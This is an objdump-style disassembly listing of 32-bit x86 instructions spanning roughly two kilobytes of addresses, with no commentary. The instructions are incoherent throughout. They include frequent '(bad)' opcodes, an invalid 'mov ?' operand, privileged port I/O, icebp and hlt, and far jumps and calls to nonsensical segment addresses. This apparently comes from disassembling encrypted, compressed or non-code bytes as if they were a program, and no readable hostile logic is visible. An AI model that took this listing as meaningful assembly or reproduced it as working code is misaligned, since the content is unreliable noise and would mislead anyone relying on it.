  4203e8:	mov    dh,0xab
  4203ea:	out    0xa3,al
  4203ec:	mov    ds:0x685d4c7,al
  4203f1:	icebp  
  4203f2:	cmp    bh,bl
  4203f4:	stos   DWORD PTR es:[edi],eax
  4203f5:	xor    eax,0x821014c6
  4203fa:	sbb    eax,0x53c07c8d
  4203ff:	jns    0x42039c
  420401:	fnstsw WORD PTR [ebp+0x1b7dcc4]
  420407:	in     eax,dx
  420408:	scas   al,BYTE PTR es:[edi]
  420409:	sub    cl,al
  42040b:	int    0xbb
  42040d:	cmp    ecx,esi
  42040f:	dec    edi
  420410:	jmp    0x7e5d:0xf0ba5716
  420417:	dec    esp
  420418:	outs   dx,BYTE PTR ds:[esi]
  420419:	das    
  42041a:	or     edi,ecx
  42041c:	stos   DWORD PTR es:[edi],eax
  42041d:	mov    eax,ds:0xedb30fd7
  420422:	test   al,0xc
  420424:	nop
  420425:	inc    ecx
  420426:	loope  0x4203d6
  420428:	jle    0x4203d9
  42042a:	icebp  
  42042b:	aad    0xfe
  42042d:	sub    bl,BYTE PTR [edx+0x6fa479be]
  420433:	(bad)  
  420434:	jmp    0x4203c7
  420436:	pop    ebp
  420437:	hlt    
  420438:	jae    0x4203d1
  42043a:	mov    cl,0xef
  42043c:	stc    
  42043d:	lock jo 0x4203e4
  420440:	lock adc dh,BYTE PTR [esp+edx*1+0x294e806f]
  420448:	outs   dx,BYTE PTR ds:[esi]
  420449:	add    ebx,ebp
  42044b:	push   ebp
  42044c:	push   esp
  42044d:	icebp  
  42044e:	sbb    ebx,eax
  420450:	rcl    BYTE PTR ds:0x96a4892c,0x68
  420457:	mov    dl,0xe3
  420459:	inc    esi
  42045a:	std    
  42045b:	jae    0x420408
  42045d:	and    al,0x7f
  42045f:	push   edi
  420460:	mov    ah,0x8c
  420462:	mov    eax,ds:0x20109b4e
  420467:	dec    ecx
  420468:	das    
  420469:	inc    ebx
  42046a:	mov    eax,ds:0xabaf6386
  42046f:	out    0x8,eax
  420471:	jle    0x4204a1
  420473:	(bad)  
  420474:	cmp    ecx,esp
  420476:	sub    DWORD PTR [esi+0x2d],0xdeec1f36
  42047d:	sub    eax,0x4c
  420480:	pop    ss
  420481:	jns    0x4204e2
  420483:	push   ebx
  420484:	mov    dh,0xd1
  420486:	ficom  WORD PTR [esp+eiz*8-0x1b]
  42048a:	aas    
  42048b:	fwait
  42048c:	adc    eax,0xd2fd8ad5
  420491:	push   eax
  420492:	add    BYTE PTR [ecx],bl
  420494:	rcl    edx,1
  420496:	mov    ah,0xbe
  420498:	adc    DWORD PTR es:[eax+0x7f],0xc71fcf97
  4204a0:	jmp    0x7deb:0x47bb0756
  4204a7:	stc    
  4204a8:	push   ss
  4204a9:	aaa    
  4204aa:	xor    BYTE PTR [ebp+edx*8-0x11],cl
  4204ae:	js     0x420436
  4204b0:	mov    BYTE PTR [ecx+ecx*1],bh
  4204b3:	sub    edi,DWORD PTR [edx-0x6b]
  4204b6:	cmp    eax,0x213b96b9
  4204bb:	inc    esp
  4204bc:	xchg   edi,eax
  4204bd:	jne    0x42052e
  4204bf:	sub    BYTE PTR [ecx],ch
  4204c1:	fcomp  st(0)
  4204c3:	sbb    esi,DWORD PTR [edi-0x27f82e3d]
  4204c9:	mov    ?,WORD PTR [eax-0x6de97a7f]
  4204cf:	mov    ebx,0x1df31e80
  4204d4:	inc    esp
  4204d5:	add    ah,bh
  4204d7:	cmp    BYTE PTR cs:[esi],dh
  4204da:	sub    cl,BYTE PTR [edx-0x2320c82e]
  4204e0:	nop
  4204e1:	rcr    BYTE PTR ds:0xa0e21821,1
  4204e7:	int3   
  4204e8:	sti    
  4204e9:	mov    cl,0x38
  4204eb:	push   cs
  4204ec:	jge    0x420522
  4204ee:	bound  edx,QWORD PTR [edx-0x2b]
  4204f1:	mov    fs,ebp
  4204f3:	and    al,0x5e
  4204f5:	loopne 0x420511
  4204f7:	jle    0x4204c9
  4204f9:	int3   
  4204fa:	call   0x8a36:0xd8712b74
  420501:	mov    dh,0x6d
  420503:	pop    ebx
  420504:	fwait
  420505:	mov    al,0x32
  420507:	rcr    DWORD PTR [edx+0x29],0x3b
  42050b:	gs jle 0x4204ab
  42050e:	mov    ecx,0xa470938a
  420513:	fs and eax,esi
  420516:	repnz verr WORD PTR [edx+0x7]
  42051b:	and    eax,0x67c798a3
  420520:	rcl    ebx,cl
  420522:	adc    al,0xe9
  420524:	cmp    dh,BYTE PTR [ecx+0x66dd24eb]
  42052a:	rcl    BYTE PTR [esp+eax*2-0x7126333c],cl
  420531:	jmp    0x749c:0xcef96201
  420538:	call   0xd0fdaac6
  42053d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42053e:	add    DWORD PTR [ebx],0xffffffde
  420541:	dec    ebx
  420542:	cmp    BYTE PTR [eax-0x3068f231],dh
  420548:	inc    ebp
  420549:	ret    0xa5a8
  42054c:	xchg   ecx,eax
  42054d:	sub    bl,al
  42054f:	xor    cl,BYTE PTR [esi+eax*1+0x41]
  420553:	outs   dx,BYTE PTR ds:[esi]
  420554:	cli    
  420555:	ret    0xfbef
  420558:	call   0x35c7:0x35b69e09
  42055f:	mov    edx,0x84058a2f
  420564:	clc    
  420565:	and    ecx,DWORD PTR [ecx-0x292a105a]
  42056b:	ins    DWORD PTR es:[edi],dx
  42056c:	mov    DWORD PTR ds:0xab5374d3,ebp
  420572:	test   BYTE PTR [ebx+0x6d],dl
  420575:	sbb    al,0x56
  420577:	cs xchg edi,eax
  420579:	mov    edi,0xd9346e8
  42057e:	lea    ebp,[edx]
  420580:	mov    edi,0x6adabbe6
  420585:	outs   dx,BYTE PTR ds:[esi]
  420586:	stos   BYTE PTR es:[edi],al
  420587:	jno    0x42058b
  420589:	xor    ebx,eax
  42058b:	mov    edi,0xcdbb304c
  420590:	inc    ebp
  420591:	rol    BYTE PTR [esi],cl
  420593:	jge    0x42058a
  420595:	jno    0x4205e9
  420597:	les    ecx,FWORD PTR [ecx]
  420599:	repnz sub DWORD PTR [esi-0x19],0xffffffe1
  42059e:	mov    esi,esp
  4205a0:	out    0x55,eax
  4205a2:	loopne 0x420557
  4205a4:	mov    eax,0x9d33214a
  4205a9:	pop    ss
  4205aa:	ins    BYTE PTR es:[edi],dx
  4205ab:	add    al,0x2f
  4205ad:	or     BYTE PTR [edx],ch
  4205af:	lods   al,BYTE PTR ss:[esi]
  4205b1:	mov    eax,ds:0x212c673f
  4205b6:	test   al,0xf
  4205b8:	add    cl,BYTE PTR [ecx-0xac6eff8]
  4205be:	test   ah,0x2d
  4205c1:	addr16 in eax,0x92
  4205c4:	es dec edi
  4205c6:	dec    edi
  4205c7:	fwait
  4205c8:	sbb    ebp,DWORD PTR [edx+0x6b203f5f]
  4205ce:	jne    0x420624
  4205d0:	loope  0x4205a7
  4205d2:	jno    0x420559
  4205d4:	or     esp,DWORD PTR [eax+0x56]
  4205d7:	pushf  
  4205d8:	lea    esi,[edi+0x4beef5c3]
  4205de:	mov    BYTE PTR [eax+edx*4-0x38],ah
  4205e2:	outs   dx,BYTE PTR ds:[esi]
  4205e3:	inc    esp
  4205e4:	retf   0x96ee
  4205e7:	and    esi,DWORD PTR [ecx-0x4b]
  4205ea:	push   0x470c2dc
  4205ef:	out    0xb2,eax
  4205f1:	xchg   edx,eax
  4205f2:	mov    ds:0xf534feb1,eax
  4205f7:	inc    edx
  4205f8:	neg    DWORD PTR [edi-0x43fd41f7]
  4205fe:	fsub   QWORD PTR cs:[edx+ebp*8+0xe]
  420603:	fwait
  420604:	out    0xc0,al
  420606:	inc    esi
  420607:	pop    esi
  420608:	mov    ch,0x35
  42060a:	dec    esi
  42060b:	sbb    DWORD PTR [ebx-0xc578ad9],edi
  420611:	mov    ecx,0xbddd2a1a
  420616:	bound  ecx,QWORD PTR [edi+0x4493c98c]
  42061c:	shl    BYTE PTR [edi+ebp*1-0x1a],0xbd
  420621:	xlat   BYTE PTR ds:[ebx]
  420622:	xor    eax,edx
  420624:	loopne 0x420626
  420626:	jl     0x420602
  420628:	lock mov dl,0x6c
  42062b:	jns    0x4205e1
  42062d:	(bad)  
  42062e:	(bad)  
  42062f:	leave  
  420630:	nop
  420631:	mov    ebp,0xdba945d0
  420636:	call   0xc52a:0x9b958852
  42063d:	in     al,dx
  42063e:	push   0xffffffb8
  420640:	add    eax,0xcd171a0e
  420645:	mov    ecx,0x86b51902
  42064a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42064b:	es clc 
  42064d:	repnz adc eax,ebx
  420650:	enter  0x4dd2,0xb1
  420654:	addr16 mov al,ds:0xf032
  420658:	lds    esp,FWORD PTR [edx]
  42065a:	mov    edi,0x52176371
  42065f:	jo     0x4206ab
  420661:	rcr    edx,cl
  420663:	xchg   ebx,eax
  420664:	jmp    0x4206b4
  420666:	or     eax,0xf6d80edd
  42066b:	in     eax,dx
  42066c:	js     0x4206d5
  42066e:	push   cs
  42066f:	popa   
  420670:	cmp    al,BYTE PTR [edi]
  420672:	mov    cl,0xe8
  420674:	mov    edx,0xf8340ce0
  420679:	add    ecx,DWORD PTR [edx-0x79]
  42067c:	lahf   
  42067d:	mov    cr6,esp
  420680:	mov    eax,ds:0x39c7ea93
  420685:	add    dh,BYTE PTR [ebp+0x6b6d2e91]
  42068b:	shr    edx,cl
  42068d:	in     eax,0xd
  42068f:	pop    edi
  420690:	mov    al,0xe2
  420692:	fsubr  DWORD PTR [esi]
  420694:	popa   
  420695:	test   al,0xf7
  420697:	call   0x73e9:0xacf96680
  42069e:	in     eax,dx
  42069f:	out    dx,al
  4206a0:	pop    ss
  4206a1:	shl    BYTE PTR cs:[ebp-0x614448a2],0xd9
  4206a9:	hlt    
  4206aa:	cdq    
  4206ab:	lock add DWORD PTR gs:[eax],ebx
  4206af:	mov    ds:0x538596e1,eax
  4206b4:	xchg   BYTE PTR [eax],dh
  4206b6:	scas   al,BYTE PTR es:[edi]
  4206b7:	shl    DWORD PTR [edi],1
  4206b9:	mov    DWORD PTR [eax-0x5fccec10],esi
  4206bf:	add    BYTE PTR [ecx],ch
  4206c1:	fs xchg ecx,eax
  4206c3:	clc    
  4206c4:	out    0x3f,eax
  4206c6:	(bad)  
  4206c7:	jp     0x420706
  4206c9:	mov    esp,0x7616ae1f
  4206ce:	and    BYTE PTR [eax],ch
  4206d0:	scas   al,BYTE PTR es:[edi]
  4206d1:	add    dh,BYTE PTR [edi-0x6e]
  4206d4:	aaa    
  4206d5:	push   edi
  4206d6:	xor    BYTE PTR [eax+0xe8ac008],dh
  4206dc:	sbb    esi,DWORD PTR [ecx]
  4206de:	jmp    0x1e800010
  4206e3:	cs or  eax,0x4770a4e5
  4206e9:	js     0x4206b8
  4206eb:	or     dh,BYTE PTR [edi-0x1d]
  4206ee:	jl     0x420708
  4206f0:	pop    esp
  4206f1:	xchg   esp,eax
  4206f2:	into   
  4206f3:	leave  
  4206f4:	es xchg edi,eax
  4206f6:	jo     0x4206b3
  4206f8:	adc    al,0x2a
  4206fa:	int    0x3
  4206fc:	sbb    ch,0xe9
  4206ff:	xchg   DWORD PTR gs:[eax],esp
  420702:	push   ebx
  420703:	cmp    al,0xe5
  420705:	int3   
  420706:	pop    eax
  420707:	call   0x43be:0xaf591bb7
  42070e:	cmp    ebx,DWORD PTR [ebx-0x5c713ed4]
  420714:	cwde   
  420715:	adc    dh,BYTE PTR [edi]
  420717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420718:	(bad)  
  420719:	mov    al,ds:0xcd5fab82
  42071e:	cmp    al,0xe2
  420720:	pop    ecx
  420721:	mov    BYTE PTR [ebx+eax*4],dh
  420724:	aam    0x18
  420726:	ins    BYTE PTR es:[edi],dx
  420727:	mov    ebp,0xa55149ed
  42072c:	jns    0x420761
  42072e:	mov    ebp,cs
  420730:	in     al,dx
  420731:	sub    BYTE PTR [ebx+0x662eb5c],bl
  420737:	test   al,0x53
  420739:	cmp    BYTE PTR [ebp-0x62],ah
  42073c:	fs add eax,0x96392443
  420742:	fcom   QWORD PTR [ebx]
  420744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420745:	xlat   BYTE PTR ds:[ebx]
  420746:	xchg   bp,ax
  420748:	xor    bh,bh
  42074a:	cdq    
  42074b:	jp     0x42079a
  42074d:	(bad)  
  42074e:	shl    BYTE PTR [bx],1
  420751:	(bad)  
  420753:	iret   
  420754:	and    DWORD PTR [ebx],0xfffffff8
  420757:	sub    bh,BYTE PTR [ebp+edx*1+0x29]
  42075b:	lea    esp,[ebx+0x50a5544b]
  420761:	gs pop esi
  420763:	in     al,0x74
  420765:	cdq    
  420766:	imul   eax,ebp,0xffffff9f
  420769:	cdq    
  42076a:	cwde   
  42076b:	pushf  
  42076c:	cmc    
  42076d:	aaa    
  42076e:	mov    ds:0x2f571f9a,eax
  420773:	aad    0x45
  420775:	shr    BYTE PTR [eax-0x20],1
  420778:	mov    ebx,0x52147f5c
  42077d:	(bad)  
  42077e:	xchg   ebp,eax
  42077f:	dec    esp
  420780:	aas    
  420781:	sbb    eax,0x4dd0196b
  420786:	in     eax,0xd8
  420788:	sub    al,0x59
  42078a:	aas    
  42078b:	or     dl,BYTE PTR [ecx+edx*8+0x67]
  42078f:	mov    ds:0xc0e696dc,eax
  420794:	(bad)  
  420795:	mov    ah,BYTE PTR [ecx-0x1a]
  420798:	lahf   
  420799:	fld    TBYTE PTR [ecx]
  42079b:	sbb    esi,DWORD PTR [edx+0x67]
  42079e:	pusha  
  42079f:	jge    0x4207c5
  4207a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207a2:	call   0x271:0x6b1cceee
  4207a9:	mov    eax,0x61df5ec8
  4207ae:	push   ds
  4207af:	or     eax,0x18908448
  4207b4:	cmp    BYTE PTR [ebp-0x6d],0x1c
  4207b8:	jmp    0xbeb5:0x6fa74c34
  4207bf:	mov    dh,0x66
  4207c1:	xor    al,0xa4
  4207c3:	pop    es
  4207c4:	jno    0x420816
  4207c6:	mov    esp,0x67a683bc
  4207cb:	jb     0x4207a6
  4207cd:	add    edi,0xffffffaa
  4207d0:	add    eax,0x5e19f8e8
  4207d5:	inc    ebp
  4207d6:	sar    BYTE PTR [edi+0x22fb48eb],1
  4207dc:	pop    esi
  4207dd:	and    BYTE PTR [ecx+0x43],ch
  4207e0:	loopne 0x420855
  4207e2:	dec    ebx
  4207e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207e4:	neg    ecx
  4207e6:	out    0xc6,eax
  4207e8:	pop    ebp
  4207e9:	gs cli 
  4207eb:	sbb    edi,DWORD PTR [eax]
  4207ed:	cdq    
  4207ee:	sbb    al,0x31
  4207f0:	sub    BYTE PTR [edx+ebx*1-0x7bd7b336],dh
  4207f7:	xor    al,BYTE PTR [ecx-0x7b34df27]
  4207fd:	xor    eax,0x67a01d98
  420802:	add    DWORD PTR [ebx],edx
  420804:	push   cs
  420805:	loope  0x4207a3
  420807:	cmp    eax,0x1c0cbab0
  42080c:	inc    ecx
  42080d:	lahf   
  42080e:	jo     0x420843
  420810:	push   ss
  420811:	cmc    
  420812:	repz jg 0x4207a1
  420815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420816:	pop    esp
  420817:	dec    eax
  420818:	inc    ebx
  420819:	pushf  
  42081a:	push   edi
  42081b:	ja     0x420839
  42081d:	scas   al,BYTE PTR es:[edi]
  42081e:	sbb    esi,DWORD PTR [edx]
  420820:	hlt    
  420821:	xchg   edi,eax
  420822:	lock mov ds:0xc473ff50,eax
  420828:	pop    ds
  420829:	pop    esp
  42082a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42082b:	mov    eax,ds:0xf95dab8e
  420830:	mov    ecx,0xee6b3740
  420835:	in     eax,0x1a
  420837:	mov    eax,0x7627f6ae
  42083c:	jl     0x42080f
  42083e:	jmp    0x42087d
  420840:	nop
  420841:	mov    ah,0x48
  420843:	mov    dl,0xec
  420845:	inc    ebx
  420846:	xchg   ecx,eax
  420847:	fs das 
  420849:	mov    cl,0x5a
  42084b:	cli    
  42084c:	push   ss
  42084d:	mov    dl,0xa4
  42084f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420850:	retf   0xacab
  420853:	std    
  420854:	push   0xe99c419b
  420859:	adc    ebx,edi
  42085b:	jmp    0x2e679439
  420860:	repz out 0xe6,al
  420863:	idiv   BYTE PTR [ebp-0x4f]
  420866:	arpl   sp,ax
  420868:	and    al,al
  42086a:	mov    eax,ds:0x7c27837e
  42086f:	aad    0xc1
  420871:	and    eax,ebp
  420873:	fs jbe 0x420866
  420876:	ins    BYTE PTR es:[edi],dx
  420877:	mov    BYTE PTR [edi+0x2d],dl
  42087a:	(bad)  
  42087b:	push   esi
  42087c:	ds pop edi
  42087e:	adc    eax,esp
  420880:	adc    eax,DWORD PTR [edi]
  420882:	pop    ecx
  420883:	and    al,0x22
  420885:	aaa    
  420886:	loopne 0x420866
  420888:	adc    BYTE PTR [ebx],bl
  42088a:	lods   al,BYTE PTR ds:[esi]
  42088b:	ins    BYTE PTR es:[edi],dx
  42088c:	inc    ebp
  42088d:	retf   0x3dde
  420890:	repnz sti 
  420892:	inc    edi
  420893:	mov    dl,0x83
  420895:	push   0xffffffbd
  420897:	(bad)  
  420898:	mov    ebp,0x9edd0d1d
  42089d:	fs or  esi,edx
  4208a0:	ror    BYTE PTR [edx+0x4a],cl
  4208a3:	aam    0xdb
  4208a5:	jnp    0x4208ac
  4208a7:	or     eax,0xe0ede794
  4208ac:	scas   al,BYTE PTR es:[edi]
  4208ad:	lds    eax,FWORD PTR [ebp+ecx*8-0x10]
  4208b1:	push   ebp
  4208b2:	pop    edx
  4208b3:	push   ss
  4208b4:	rcr    DWORD PTR [ebp-0x66],0xdc
  4208b8:	dec    ebx
  4208b9:	jmp    0x4208f3
  4208bb:	adc    esi,ebx
  4208bd:	jne    0x42092f
  4208bf:	cwde   
  4208c0:	cdq    
  4208c1:	mov    ds:0x84cd1c4e,eax
  4208c6:	xchg   edx,eax
  4208c7:	sub    eax,0xf7fc67e3
  4208cc:	push   ss
  4208cd:	cmp    BYTE PTR [edx-0x2c],al
  4208d0:	rol    edx,0x4a
  4208d3:	retf   0x16d8
  4208d6:	add    cl,ah
  4208d8:	push   ebp
  4208d9:	dec    ebp
  4208da:	fwait
  4208db:	mov    esp,DWORD PTR [ebx]
  4208dd:	shl    ah,cl
  4208df:	aad    0xbd
  4208e1:	std    
  4208e2:	(bad)
  4208e6:	adc    BYTE PTR [edi-0x56],ch
  4208e9:	xor    eax,0x3815dbc9
  4208ee:	push   ecx
  4208ef:	adc    BYTE PTR [esi],bh
  4208f1:	arpl   WORD PTR [ecx],di
  4208f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208f4:	push   0xffffff91
  4208f6:	xor    dh,bl
  4208f8:	cdq    
  4208f9:	cmp    al,0x11
  4208fb:	mov    ebp,0xeffc2c4d
  420900:	fistp  WORD PTR [esi-0x26]
  420903:	ins    DWORD PTR es:[edi],dx
  420904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420905:	dec    eax
  420906:	pop    edx
  420907:	xchg   ebx,eax
  420908:	sar    DWORD PTR [ebp*1+0x305e519c],0x60
  420910:	repnz aas 
  420912:	mov    al,0x6c
  420914:	pop    edi
  420915:	sub    esi,DWORD PTR [ebx+0x3b58b9ac]
  42091b:	aas    
  42091c:	into   
  42091d:	out    dx,eax
  42091e:	(bad)  
  420920:	inc    eax
  420921:	sub    al,0x1f
  420923:	stc    
  420924:	push   0xd1f83500
  420929:	xor    ebp,DWORD PTR [esi-0x10f74434]
  42092f:	xchg   esi,eax
  420930:	pop    eax
  420931:	xchg   ebx,eax
  420932:	sub    edi,ebx
  420934:	retf   0x1bd8
  420937:	dec    edi
  420938:	lods   eax,DWORD PTR ds:[esi]
  420939:	out    dx,eax
  42093a:	mov    WORD PTR [ebx],cs
  42093c:	ret    
  42093d:	push   edx
  42093e:	aam    0x8d
  420940:	push   ecx
  420941:	js     0x420942
  420943:	adc    eax,0xf23efc02
  420948:	or     BYTE PTR [ecx+eiz*1+0x3196e297],al
  42094f:	cdq    
  420950:	in     al,0x5b
  420952:	repz aas 
  420954:	xor    dl,BYTE PTR [esi-0x22]
  420957:	out    0xf1,eax
  420959:	push   esp
  42095a:	mov    eax,ds:0x73417fab
  42095f:	retf   
  420960:	push   esp
  420961:	mov    WORD PTR [esi-0x6232cfd2],gs
  420967:	cld    
  420968:	dec    edi
  420969:	sbb    DWORD PTR [edi+0x65],esi
  42096c:	xchg   esi,eax
  42096d:	inc    esp
  42096e:	add    BYTE PTR [esi],0x75
  420971:	mov    bh,0x91
  420973:	les    ebx,FWORD PTR [edx-0x22]
  420976:	pop    edi
  420977:	es in  al,dx
  420979:	pop    ds
  42097a:	and    esp,edi
  42097c:	cmp    ecx,ecx
  42097e:	push   esi
  42097f:	(bad)  
  420981:	in     al,dx
  420982:	sub    al,0x99
  420984:	push   ebx
  420985:	lock pop esp
  420987:	xor    edx,ebp
  420989:	xchg   ecx,eax
  42098a:	mov    edx,fs
  42098c:	clc    
  42098d:	dec    eax
  42098e:	push   ds
  42098f:	add    esp,DWORD PTR [ebx+ebp*2+0x62]
  420993:	xchg   ebx,eax
  420995:	jl     0x4209d4
  420997:	or     DWORD PTR [edi],esi
  420999:	out    dx,al
  42099a:	cmp    ch,BYTE PTR [edx-0x59]
  42099d:	into   
  42099e:	ret    
  42099f:	fsubr  QWORD PTR [ebx+0x4d3fc072]
  4209a5:	aas    
  4209a6:	push   edx
  4209a7:	cld    
  4209a8:	pushf  
  4209a9:	fild   DWORD PTR [edx+0x203fde4c]
  4209af:	pop    edx
  4209b0:	loop   0x4209b8
  4209b2:	jnp    0x42097c
  4209b4:	nop
  4209b5:	(bad)  
  4209b6:	jmp    0x4209ba
  4209b8:	addr16 jp 0x4209d8
  4209bb:	shl    ebx,0x65
  4209be:	adc    al,0xc5
  4209c0:	dec    ebp
  4209c1:	mov    eax,0x6597b4a4
  4209c6:	push   ebx
  4209c7:	push   ebx
  4209c8:	inc    esi
  4209c9:	adc    bh,al
  4209cb:	fsubr  QWORD PTR [ebp+0x29c5ac9f]
  4209d1:	into   
  4209d2:	shl    DWORD PTR [eax+edi*2+0x3c3c19b3],0x7e
  4209da:	stc    
  4209db:	mov    edi,0xb69ff1d1
  4209e0:	xor    ebp,DWORD PTR [esi+eax*1]
  4209e3:	add    al,0xe5
  4209e5:	adc    al,0x49
  4209e7:	adc    ch,dh
  4209e9:	pop    ds
  4209ea:	mov    cl,bh
  4209ec:	jle    0x4209ec
  4209ee:	and    ebx,esp
  4209f0:	push   ebx
  4209f1:	jo     0x420a08
  4209f3:	inc    esi
  4209f4:	and    eax,0x38d2e948
  4209f9:	mov    ds:0x802230f5,eax
  4209fe:	and    eax,0x1574b78a
  420a03:	mov    ch,0x88
  420a05:	sub    esi,DWORD PTR [edi+0x76e674b4]
  420a0b:	(bad)  
  420a0c:	jge    0x4209a6
  420a0e:	mov    ecx,0x8c60d636
  420a13:	inc    edi
  420a14:	xlat   BYTE PTR ds:[ebx]
  420a15:	push   esi
  420a16:	push   es
  420a17:	rcl    BYTE PTR [edx],0xda
  420a1a:	xchg   esi,eax
  420a1b:	ret    0xb2a4
  420a1e:	out    0x41,eax
  420a20:	inc    edx
  420a21:	add    al,0x4a
  420a23:	mov    ds:0x6c5b1e0f,eax
  420a28:	and    eax,0xc5518d61
  420a2d:	adc    eax,0xdd4fb005
  420a32:	jmp    0x420a02
  420a34:	sbb    al,0x32
  420a36:	nop
  420a37:	or     al,0xa8
  420a39:	mov    eax,0x5e4dcca9
  420a3e:	js     0x420a84
  420a40:	mov    bh,0xd8
  420a42:	mov    bh,0xa2
  420a44:	adc    al,0x9a
  420a46:	jecxz  0x420a4b
  420a48:	fadd   DWORD PTR [esi-0x7e]
  420a4b:	cmp    BYTE PTR [ebx+0x3d58c435],dh
  420a51:	xor    eax,0xc8ca577e
  420a56:	gs cwde 
  420a58:	pop    DWORD PTR [ebx+0x38]
  420a5b:	mov    DWORD PTR [ebx],0xa7ea4928
  420a61:	jno    0x420a63
  420a63:	leave  
  420a64:	aaa    
  420a65:	pop    esp
  420a66:	(bad)  
  420a67:	and    BYTE PTR [ebx-0x18],ah
  420a6a:	sbb    esi,DWORD PTR [edx-0x78]
  420a6d:	push   esp
  420a6e:	pop    edi
  420a6f:	out    0x65,eax
  420a71:	stos   DWORD PTR es:[edi],eax
  420a72:	dec    esi
  420a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a74:	ds popf 
  420a76:	push   0xc
  420a78:	mov    bl,0x4
  420a7a:	and    al,0xa9
  420a7c:	push   ss
  420a7d:	jbe    0x420a8b
  420a7f:	test   eax,0xda76de10
  420a84:	ror    BYTE PTR ds:0x9ed2adb8,cl
  420a8a:	iret   
  420a8b:	push   ebp
  420a8c:	sub    eax,0x63a6b369
  420a91:	push   esi
  420a92:	add    eax,0xd79ce963
  420a97:	pop    edx
  420a98:	add    al,0x6c
  420a9a:	sti    
  420a9b:	mov    ch,0xa0
  420a9d:	mov    ds:0xcbe501a0,al
  420aa2:	add    eax,0x9dd3faf8
  420aa7:	adc    eax,0x1c8dc0a5
  420aac:	loopne 0x420ae8
  420aae:	inc    eax
  420aaf:	mov    esi,0x8c28f8b6
  420ab4:	fnstsw WORD PTR [edi]
  420ab6:	push   cs
  420ab7:	mov    ds,WORD PTR [ecx]
  420ab9:	jnp    0x420acd
  420abb:	or     BYTE PTR [ecx+0x3],bh
  420abe:	jae    0x420b06
  420ac0:	dec    edi
  420ac1:	mov    ds:0x5bf55ca6,eax
  420ac6:	add    ah,dl
  420ac8:	cmc    
  420ac9:	xor    al,0xb6
  420acb:	add    eax,DWORD PTR [ebp+0xdb3f263]
  420ad1:	js     0x420b4e
  420ad3:	pop    esi
  420ad4:	cmp    eax,0x4018c400
  420ad9:	sbb    ebp,DWORD PTR [ecx+0x7b0b5524]
  420adf:	repnz stos BYTE PTR es:[edi],al
  420ae1:	sub    eax,DWORD PTR [ebp+0x26c37dba]
  420ae7:	scas   al,BYTE PTR es:[edi]
  420ae8:	pop    ebx
  420ae9:	cmp    BYTE PTR [edi-0x8],0xc7
  420aed:	rol    DWORD PTR [esp],0xcd
  420af1:	adc    edi,eax
  420af3:	out    dx,al
  420af4:	test   al,0x8b
  420af6:	xchg   esp,eax
  420af7:	xlat   BYTE PTR ds:[ebx]
  420af8:	mov    DWORD PTR [ebx],eax
  420afa:	mov    DWORD PTR [esi-0x19],0x49188ebe
  420b01:	push   cs
  420b02:	mov    cl,BYTE PTR [ecx-0x5e3a67dd]
  420b08:	mov    cl,0x8e
  420b0a:	ror    BYTE PTR [ebp+0x19],cl
  420b0d:	inc    edx
  420b0e:	jo     0x420b5b
  420b10:	outs   dx,BYTE PTR ds:[esi]
  420b12:	lock fld DWORD PTR [esi-0x1]
  420b16:	repnz push edi
  420b18:	daa    
  420b19:	push   ebx
  420b1a:	jns    0xdc945e70
  420b20:	fbld   TBYTE PTR [edi-0x12]
  420b23:	enter  0x2911,0x92
  420b27:	icebp  
  420b28:	xchg   edx,eax
  420b29:	out    0xee,al
  420b2b:	push   0x19894e6d
  420b30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b31:	xor    DWORD PTR [esi+eax*4-0x7dc06174],ecx
  420b38:	inc    esp
  420b39:	xchg   edi,eax
  420b3a:	sbb    edi,ecx
  420b3c:	sbb    BYTE PTR [eax],ch
  420b3e:	ins    DWORD PTR es:[edi],dx
  420b3f:	and    BYTE PTR [ecx-0x75],dh
  420b42:	hlt    
  420b43:	idiv   DWORD PTR [edx-0x5f]
  420b46:	out    dx,eax
  420b47:	mov    ch,0xbd
  420b49:	mov    eax,ds:0x9e70c747
  420b4e:	ins    DWORD PTR es:[edi],dx
  420b4f:	dec    edi
  420b50:	rcpps  xmm4,xmm0
  420b53:	adc    al,0x6c
  420b55:	into   
  420b56:	mov    ch,0xf
  420b58:	fidiv  DWORD PTR [ebx+0x1f]
  420b5b:	fnsave [eax-0x386c6e0d]
  420b61:	jge    0x420bce
  420b63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b64:	xor    esp,DWORD PTR [edx]
  420b66:	xchg   ebp,eax
  420b67:	retf   0x6ba
  420b6a:	test   BYTE PTR [esi-0x76],ah
  420b6d:	test   eax,0xbe55de06
  420b72:	in     eax,0x37
  420b74:	lods   al,BYTE PTR ds:[esi]
  420b75:	and    BYTE PTR [eax],bh
  420b77:	add    eax,0xc3266bb3
  420b7c:	or     DWORD PTR [edx+0x6494d4b1],ecx
  420b82:	inc    eax
  420b83:	popa   
  420b84:	in     al,0xc2
  420b86:	adc    eax,0x4dbc05c3
  420b8b:	jne    0x420bfc
  420b8d:	jb     0x420b70
  420b8f:	mov    al,ds:0x685bd689
  420b94:	jp     0x420bb2
  420b96:	iret   
  420b97:	aad    0xb1
  420b99:	sbb    BYTE PTR [esi-0x2e0b987],cl
  420b9f:	push   ecx
  420ba0:	xchg   esi,eax
  420ba1:	mov    eax,0x4367db8f
  420ba6:	and    al,0x33
  420ba8:	cli    
  420ba9:	into   
  420baa:	out    0x83,al
  420bac:	scas   eax,DWORD PTR es:[edi]
  420bad:	or     eax,0x7c4ba231
  420bb2:	loopne 0x420bd9
  420bb4:	(bad)
  420bb7:	sub    eax,0xefdae561
  420bbc:	adc    DWORD PTR [ebp-0x41],esp
  420bbf:	nop
  420bc0:	outs   dx,DWORD PTR ds:[esi]
  420bc1:	call   0xf7be6117
  420bc6:	add    DWORD PTR [ecx],0xffffff8c
  420bc9:	fstp   TBYTE PTR [edx+0x8]
